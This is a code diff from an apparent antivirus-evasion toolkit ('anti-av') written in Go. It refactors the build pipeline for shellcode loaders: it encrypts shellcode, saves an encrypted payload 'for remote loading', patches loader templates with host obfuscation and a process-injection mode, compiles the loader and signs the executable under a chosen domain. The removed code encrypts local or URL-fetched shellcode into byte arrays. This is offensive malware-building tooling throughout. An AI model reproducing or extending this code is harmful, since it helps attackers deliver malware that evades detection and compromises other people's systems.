@@ -8,7 +8,6 @@ import (
 	"os/exec"
 	"path/filepath"
 	"runtime"
-	"strings"
 	"time"
 
 	"github.com/b1gcat/anti-av/utils"
@@ -16,9 +15,10 @@ import (
 )
 
 var (
-	buildDir = filepath.Join("dist", "_tmp")
-	copyCmd  = "cp"
-	export   = "export"
+	buildDir     = filepath.Join("dist", "_tmp")
+	ePayloadFile = filepath.Join("dist", "payload.e")
+	copyCmd      = "cp"
+	export       = "export"
 )
 
 func init() {
@@ -30,49 +30,80 @@ func init() {
 }
 
 func (c *config) build() {
-	c.buildPayload()
-	code, err := c.genCode()
+	code, err := c.generateCode()
 	if err != nil {
-		logrus.Error(err.Error())
+		logrus.Error("[-] ", err.Error())
 		return
 	}
-	logrus.Info("[*] Generated Code Done.")
-	if err := c.buildCode(code); err != nil {
-		logrus.Error(err.Error())
+	//保存加密payload
+	if c.crypt {
+		if err := ioutil.WriteFile(ePayloadFile, code, 0755); err != nil {
+			logrus.Error("[-] ", err.Error())
+			return
+		}
+		logrus.Info("[+] Encrypted Payload For Remote Loading:", ePayloadFile)
 		return
 	}
-	logrus.Info("[*] Build Done")
+
+	logrus.Info("[+] Generated Code Done.")
+	if err := c.building(code); err != nil {
+		logrus.Error("[-] ", err.Error())
+		return
+	}
+	logrus.Info("[+] Build Done")
 }
 
-func (c *config) buildCode(code []byte) error {
-	//初始化临时目录
-	os.RemoveAll(buildDir)
-	os.Mkdir(buildDir, 0755)
-	if err := utils.Cmd(fmt.Sprintf("%s %s %s", copyCmd, filepath.Join("loader", c.loader, "*.go"), buildDir)); err != nil {
+func (c *config) building(code []byte) error {
+	if err := c.setup(); err != nil {
 		return err
 	}
-
 	//切换到临时目录编译
+	logrus.Info("[+] Enter ", buildDir)
 	os.Chdir(buildDir)
-	defer os.RemoveAll(filepath.Join("..", "_tmp"))
+	//完成后清空
+	defer func() {
+		logrus.Info("[+] Remove ", buildDir)
+		defer os.RemoveAll(filepath.Join("..", "_tmp"))
+	}()
 
-	ref := Ref{
-		CODE:            string(code),
-		HOST_OBFUSCATOR: c.hostObfuscator,
-		HACK:            "NORMAL",
-	}
-	if c.inject {
-		ref.HACK = "INJECT"
-	}
-
-	if err := c.payloadPatch(&ref, "sc.go"); err != nil {
+	if err := c.prepare(code); err != nil {
 		return err
 	}
 
 	if err := c.compile(); err != nil {
 		return err
 	}
+	return nil
+}
 
+func (c *config) setup() error {
+	os.RemoveAll("dist/_tmp")
+	logrus.Info("[+] Create ", buildDir)
+	os.Mkdir(buildDir, 0755)
+	loader := filepath.Join(buildDir, c.loader)
+	os.Mkdir(loader, 0755)
+	if err := utils.Cmd(fmt.Sprintf("%s %s %s", copyCmd, filepath.Join("loader", c.loader, "*.go"), loader)); err != nil {
+		return err
+	}
+	if err := utils.Cmd(fmt.Sprintf("%s %s %s", copyCmd, filepath.Join("loader", "binary", "*.go"), buildDir)); err != nil {
+		return err
+	}
+	return nil
+}
+
+func (c *config) prepare(code []byte) error {
+	ref := patch{
+		CODE:            c.formatPayload(code),
+		HOST_OBFUSCATOR: c.hostObfuscator,
+		HACK:            "NORMAL",
+		LOADER:          c.loader,
+	}
+	if c.inject {
+		ref.HACK = "INJECT"
+	}
+	if err := c.patch(&ref, "."); err != nil {
+		return err
+	}
 	return nil
 }
 
@@ -109,34 +140,4 @@ func (c *config) compile() error {
 		utils.SignExecutable(c.domain, output)
 	}
 	return nil
-}
-
-func (c *config) genCode() ([]byte, error) {
-	var sc []byte
-	var err error
-
-	key := make([]byte, 8)
-	if strings.HasPrefix(c.shellcode, "http") {
-		sc = []byte(c.shellcode)
-		//下载shellcode标记
-		rand.Read(key[4:])
-	} else {
-		sc, err = ioutil.ReadFile(c.shellcode)
-		if err != nil {
-			return nil, err
-		}
-		rand.Read(key)
-	}
-
-	esc, err := c.payloadEncrypt(key, sc, false)
-	if err != nil {
-		return nil, err
-	}
-
-	codeBuf := make([]string, 0)
-	for _, v := range esc {
-		codeBuf = append(codeBuf, fmt.Sprintf("0x%02x", v))
-	}
-
-	return []byte(strings.Join(codeBuf, ",")), nil
 }
